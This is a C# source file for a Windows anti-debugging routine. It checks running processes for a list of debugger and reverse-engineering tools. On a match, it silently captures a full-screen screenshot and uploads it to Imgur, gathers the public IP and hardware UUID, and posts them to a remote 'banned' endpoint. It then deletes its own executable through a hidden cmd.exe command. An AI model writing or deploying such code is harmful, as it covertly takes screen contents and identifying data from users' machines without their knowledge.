using System.Diagnostics;
using System;
using System.IO;
using RestSharp;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Http;
using System.Threading.Tasks;
namespace antidebug
{
    internal class Program
    {
        static async Task Main()
        {
            string[] processNamesToCheck = {
                "HTTPDebuggerUI", "ida", "ghidra", "ollydbg", "x64dbg", "radare2", "hopper", "binaryninja",
                "cheatengine", "immunitydebugger", "ida64", "idaq", "ghidraSvr", "ollydbg64", "x32dbg",
                "x64dbg", "bnja", "cheatengine-x86_64", "ImmunityDebugger"
            };

            foreach (string processName in processNamesToCheck)
            {
                Process[] processes = Process.GetProcessesByName(processName);

                if (processes.Length > 0)
                {
                    Bitmap screenshot = CaptureScreen();
                    string tempPath = Path.GetTempPath();
                    string imagePath = Path.Combine(tempPath, "screenshot.png");
                    screenshot.Save(imagePath, ImageFormat.Png);

                    string imageUrl = await UploadToImgur(imagePath);
                    Console.WriteLine(imageUrl);
                    string ip = GetPublicIPAddress();
                    DateTime currentDateTime = DateTime.Now;
                    Process process = new Process();
                    process.StartInfo.FileName = "wmic";
                    process.StartInfo.Arguments = "csproduct get uuid";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.Start();
                    string line;
                    int lineCount = 0;
                    string hwid=null ;
                    while ((line = process.StandardOutput.ReadLine()) != null)
                    {
                        if (!string.IsNullOrWhiteSpace(line))
                        {
                            lineCount++;
                            if (lineCount == 2)
                            {
                                hwid = line.Trim();
                                break;
                            }
                        }
                    }
                    string reason = $"You were blocked for the following reason: during the launch of the program, a prohibited {processName} process was detected";
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    var client = new RestClient("http://111.111.111/users/api/v1/users");
                    var request = new RestRequest("banned",Method.Post);
                    request.AddHeader("Content-Type", "application/json");

                    var requestBody = new
                    {
                        ip = ip,
                        date = currentDateTime.ToString(),
                        hwid = hwid,
                        reason = reason,
                        screenshot = imageUrl
                    };

                    request.AddJsonBody(requestBody);

                    var response = client.Execute(request);                    

                    Process.Start(new ProcessStartInfo
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"", 
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true, 
                        FileName = "cmd.exe", 
                        UseShellExecute = false 
                    });
                    Environment.Exit(0);
                }
                else
                {
                    
                }
            }
            //запуск главного окна
        }
        static Bitmap CaptureScreen()
        {
            int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            Bitmap screenshot = new Bitmap(screenWidth, screenHeight);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));
            return screenshot;
        }


        static async Task<string> UploadToImgur(string imagePath)
        {
            string clientId = "cfca21c5e2b39f2"; //  ID с imgur.com

            using (var httpClient = new HttpClient())
            {
                using (var form = new MultipartFormDataContent())
                {
                    byte[] imageBytes = File.ReadAllBytes(imagePath);
                    form.Add(new ByteArrayContent(imageBytes), "image", Path.GetFileName(imagePath));

                    httpClient.DefaultRequestHeaders.Add("Authorization", "Client-ID " + clientId);

                    var response = await httpClient.PostAsync("https://api.imgur.com/3/image", form);

                    if (response.IsSuccessStatusCode)
                    {
                        string responseContent = await response.Content.ReadAsStringAsync();
                        dynamic jsonResponse = Newtonsoft.Json.JsonConvert.DeserializeObject(responseContent);
                        return jsonResponse.data.link;
                    }
                    else
                    {
                        return null;
                    }
                }
            }
        }
        static string GetPublicIPAddress()
        {
            WebClient client = new WebClient();
            string ip = client.DownloadString("https://api.ipify.org");
            return ip;
        }
    }

}
